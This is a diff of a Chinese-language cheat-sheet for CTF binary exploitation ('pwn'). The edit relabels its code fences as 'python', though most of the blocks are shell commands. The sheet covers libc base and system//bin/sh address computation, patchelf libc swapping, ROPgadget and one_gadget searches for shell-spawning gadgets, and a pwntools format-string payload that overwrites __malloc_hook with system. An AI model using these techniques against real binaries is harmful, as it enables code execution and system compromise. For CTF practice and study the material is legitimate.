@@ -53,20 +53,20 @@ system_addr = base + libc.dump('system')
 binsh_addr = base + libc.dump('str_bin_sh')
 ```
 
-```
+```python:
 查看沙箱过滤的函数:  
 seccomp-tools dump ./pwn 
 ```
 
 ld版本切换指令:
 
-```
+```python:
 patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./pwn#pwn是文件名，前面是你想换成的ld名
 ```
 
 libc版本切换指令:
 
-```
+```python:
 patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn#前面是现在使用的libc名字，后面是你想换的版本
 ```
 
@@ -74,29 +74,29 @@ patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn#前面是现在使用的li
 
 64位传参顺序  rdi   rsi   rdx   rcx   r8   r9
 
-```
+```python:
 ROPgadget --binary pwn --only 'pop|ret' | grep 'eax’     only是筛选条件，grep是二次筛选
 ```
 
-```
+```python:
 ROPgadget --binary pwn --string '/bin/sh'   找字符串
 ```
 
-```
+```python:
 ROPgadget --binary pwn89 | grep leave      找leave
 ```
 
-```
+```python:
 ROPgadget --binary pwn --ropchain   常用于静态编译,自动根据各种gadget地址生成一个可用的payload,覆盖到ret即可
 ```
 
-```
+```python:
 one_gadget /lib/x86_64-linux-gnu/libc.so.6   用于已知libc版本,直接提取getshell的片段
 ```
 
 ## pwntools库的fmt封装语法
 
-```
+```python:
 writes = {0x804a04c :u32('sh;a'),libc.symbols['__malloc_hook']:libc.symbols['system']}
 
 payload_1 = fmtstr_payload(offset = 7,writes = writes,numbwritten = 0,write_size = 'short')
